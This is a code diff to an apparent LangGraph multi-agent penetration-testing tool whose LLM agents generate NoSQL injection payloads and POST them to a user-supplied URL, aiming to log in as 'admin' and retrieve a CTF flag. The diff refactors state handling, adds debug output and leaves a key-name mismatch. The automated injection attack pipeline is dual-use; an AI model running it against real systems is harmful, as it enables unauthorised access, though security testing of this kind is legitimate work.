@@ -6,7 +6,7 @@ import nest_asyncio
 import requests
 from langgraph.graph import START, END, StateGraph
 from langchain_core.messages import HumanMessage
-from prompts import (
+from agents.prompts import (
     scanner_input_generator_prompt,
     planner_agent_prompt,
     attacker_agent_prompt,
@@ -14,7 +14,7 @@ from prompts import (
     exploit_evaluator_agent_prompt,
     report_writer_agent_prompt,
 )
-from outputs import (
+from agents.outputs import (
     ExploitEvaluatorOutput,
     AttackerOutput,
     PlannerOutput,
@@ -122,6 +122,8 @@ def fetch_initial_scrape(url: str) -> str:
 
 
 async def main():
+    scanner_tool = ScanForNoSQLITool()
+
     url = sys.argv[1]
 
     goal = "login with username 'admin' using nosql injection and retrieve ctf flag"
@@ -133,6 +135,7 @@ async def main():
     class FullPentestState(TypedDict):
         url: str
         goal: str
+        entry_point: str
         website_scrape: str
         messages: List[Any]
         scanner_tool_inputs: Optional[Any]
@@ -142,6 +145,7 @@ async def main():
         critic_decision: Optional[str]
         final_report: Optional[str]
         iteration_count: int
+        fields: List[str]
 
     async def scanner_input_structurer(state: FullPentestState):
         """Structure scanner inputs directly from website scrape."""
@@ -181,16 +185,17 @@ Return the scanner tool inputs with:
             prompt,
             ScannerInputOutput,
         )
-        return {"scanner_tool_inputs": result["scanner_tool_inputs"]}
+        return {"scanner_tool_inputs": result["scanner_tool_inputs"],
+                "entry_point": result["scanner_tool_inputs"]['entry_point'],
+                "fields": result["scanner_tool_inputs"]['fields']}
 
     async def manual_scanner(state: FullPentestState):
         """Run the manual NoSQL scanner tool."""
-        scanner_inputs = state["scanner_tool_inputs"]
-        scanner_tool = ScanForNoSQLITool()
+        
         
         res = await scanner_tool.arun({
-            "url": scanner_inputs["endpoint"],
-            "fields": scanner_inputs["fields"],
+            "url": state["endpoint"],
+            "fields": state["fields"],
         })
         
         print("\n=== MANUAL SCANNER OUTPUT ===")
@@ -205,16 +210,16 @@ Return the scanner tool inputs with:
 You are a Penetration Testing Planner Agent creating NoSQL injection payloads.
 
 === TARGET URL ===
-{state['url']}
+{state['entry_point']}
+
+=== FIELDS REQUIRED ===
+{state['fields']}
 
 === GOAL ===
 {state['goal']}
 
 === MANUAL SCAN REPORT ===
 {state['manual_scan_report']}
-
-=== SCANNER INPUTS ===
-{json.dumps(state['scanner_tool_inputs'], indent=2)}
 
 Based on the manual scan findings, generate 5 specific NoSQL injection payloads to test.
 Each payload should be ready to send in a POST request body.
@@ -259,17 +264,20 @@ Return the endpoint URL and 5 payloads.
                 post_data = {payload_obj["field_name"]: payload_obj["payload"]}
                 
                 # Execute the request
+                print('\ntrying...')
+                print(f"endpoint: {endpoint}")
+                print(f"post_data: {post_data}")
                 response = requests.post(
                     endpoint,
                     json=post_data,
                     timeout=10,
-                    headers={"User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)"}
+                    headers={"User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)", "Content-Type": "application/json"}
                 )
-                
+
                 result = {
                     "payload": payload_obj,
                     "status_code": response.status_code,
-                    "response_body": response.text[:500],  # Truncate for safety
+                    "response_body": response.text,  # Truncate for safety
                     "success": response.status_code == 200
                 }
                 
@@ -463,7 +471,6 @@ Return a structured report in JSON format with all sections.
 
     workflow = graph.compile()
 
-    # Execute the workflow
     final_state = await workflow.ainvoke(
         {
             "messages": [
@@ -479,6 +486,10 @@ Return a structured report in JSON format with all sections.
             "critic_decision": None,
             "final_report": None,
             "iteration_count": 0,
+            "entry_point": "",
+            "fields": [],
+            
+            
         }
     )
 
